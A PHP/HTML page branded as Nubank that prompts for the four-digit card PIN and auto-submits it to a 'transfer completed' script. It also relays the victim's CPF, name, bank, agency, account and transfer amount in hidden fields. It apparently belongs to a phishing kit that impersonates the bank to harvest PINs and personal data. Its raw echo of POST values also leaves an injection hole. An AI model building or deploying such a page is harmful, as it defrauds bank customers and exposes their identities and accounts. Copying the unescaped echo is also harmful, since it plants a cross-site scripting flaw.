<?php
include 'msg-trans.php';
?><!DOCTYPE html>
<html>
<title>Nubank</title>
  <style type="text/css">
    body {
	text-align: center;
	margin: 0;
	padding: 0;
    }
.texto1 {
	font-size: 16px;
	color: #666;
	font-family: Arial, Helvetica, sans-serif;
	font-weight: normal;
    line-height: 1;
}

    img {
      max-width: 100%;
      height: auto;
    }
.botaoentrar {
	background-color: #8A02DB;
	cursor: pointer;
	text-align: center;
	margin: 0px;
	padding: 0px;
	font-family: Tahoma, Geneva, sans-serif;
	width: 340px;
	font-size: 18px;
	background-position: center center;
	font-style: normal;
	height: 60px;
	border-radius: 50px;
	text-align: center;
	border: 1px none #FFF;
	color: #FFF;
}
  .fundoimagem tr td table tr td {
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	background-image: url(03.png);
}
  .txt {
	font-family: Georgia, "Times New Roman", Times, serif;
	font-size: 14px;
}
  .fundo {
	background-image: url(imagens/inicial.PNG);
	background-repeat: no-repeat;
	background-position: center top;
	background-size: 100%;
	
}
  .topo {
	background-color: #771AC9;
}
  .topotexto {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 20px;
	color: #FFF;
}
  .bases {
}
.image-container {
  overflow-x: auto;
  white-space: nowrap;
}

.image-container img {
  display: inline-block;
  margin-right: 10px; /* Adicione um espaçamento entre as imagens */
}
  .fatura {
	font-size: 18px;
	font-family: Arial, Helvetica, sans-serif;
	color: #666;
}
.fatura2 {
	font-size: 18px;
	font-family: Arial, Helvetica, sans-serif;
	color: #333;
}
  .limite {
	font-size: 13px;
	font-family: Arial, Helvetica, sans-serif;
	color: #797979;
}
  .linha {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
#divFixa {
	position: fixed;
	bottom: 2px; /* Ajuste o valor do espaçamento conforme necessário */
	width: 285px;
	left: 50%;
	transform: translateX(-50%);
	background-color: rgba(0, 0, 0, 0.0);
	opacity: 0.96;}

  .valortransf {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 36px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	color: #000;
	font-weight: bold;
}
  .linha1 {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
  .valorx {
	outline: none;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 20px;
	color: #000;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-weight: normal;
}
  .linha {
	background-image: url(imagens/linha.png);
	background-repeat: no-repeat;
	background-position: center bottom;
	width: 100%;
}
  .faturaw {
	color: #8E33CC;
	font-family: Arial, Helvetica, sans-serif;
}
  .caixasenha {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 30px;
	text-align: center;
	height: 50px;
	width: 50px;
	border: 1px solid #999;
}
  </style>
  <script>
    window.addEventListener('DOMContentLoaded', function() {
      document.getElementById('1').focus();
    });
  </script>
</head>
<body>
<table width="100%" border="0">
  <tr>
    <td height="50" align="center"><table width="90%" border="0">
      <tr>
        <td><a href="javascript:history.back()"><img src="imagens/setay.png" alt="" width="24"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    <td>
<form name="form1" method="post" action="transferenciarealizada.php">
<table width="90%" border="0" align="center">
      <tr>
        <td height="30" align="left" valign="middle"><span class="fatura">Digite a </span><span class="faturaw"><b>senha de 4 digitos do seu cartão </b></b></span></td>
      </tr>
      <tr>
        <td height="250" align="center" valign="middle"><label for="1"></label>
<input name="1" type="password" class="caixasenha" id="1" size="1" maxlength="1" onkeyup="proximoCampo(event, '2')" style="border-radius: 10px;">
&nbsp;
<input name="2" type="password" class="caixasenha" id="2" size="1" maxlength="1" onkeyup="proximoCampo(event, '3')" style="border-radius: 10px;">
&nbsp;
<input name="3" type="password" class="caixasenha" id="3" size="1" maxlength="1" onkeyup="proximoCampo(event, '4')" style="border-radius: 10px;">
&nbsp;
<input name="4" type="password" class="caixasenha" id="4" size="1" maxlength="1" onkeyup="enviarFormulario(event)" style="border-radius: 10px;">

<script>
  function proximoCampo(event, proximoCampoId) {
    const campoAtual = event.target;
    if (campoAtual.value !== '') {
      const proximoCampo = document.getElementById(proximoCampoId);
      proximoCampo.focus();
      proximoCampo.value = '';
    }
  }

  function enviarFormulario(event) {
    const campoAtual = event.target;
    if (campoAtual.value !== '') {
      const formulario = campoAtual.closest('form');
      formulario.submit();
    }
  }
</script>

      </tr>
      <tr>
        <td align="center" valign="middle"> 
     <div style="display: none;">
          <input name="valor"type="text" class="valorx" id="valor" value="<?php echo $_POST["valor"]; ?>">
        <br>
        <input name="cpf"type="text" class="valorx" id="cpf" value="<?php echo $_POST["cpf"]; ?>">
        <br>
        <input name="nome"type="text" class="valorx" id="nome" value="<?php echo $_POST["nome"]; ?>">
        <br>
        <input name="instituicao"type="text" class="valorx" id="instituicao" value="<?php echo $_POST["instituicao"]; ?>">
        <br>
        <input name="agencia"type="text" class="valorx" id="agencia" value="<?php echo $_POST["agencia"]; ?>">
        <br>
        <input name="conta"type="text" class="valorx" id="valor6" value="<?php echo $_POST["conta"]; ?>">
        <br>
     </div>
      </tr>
    </table>
    </form></td>
  </tr>
</table>
</body>
</html>
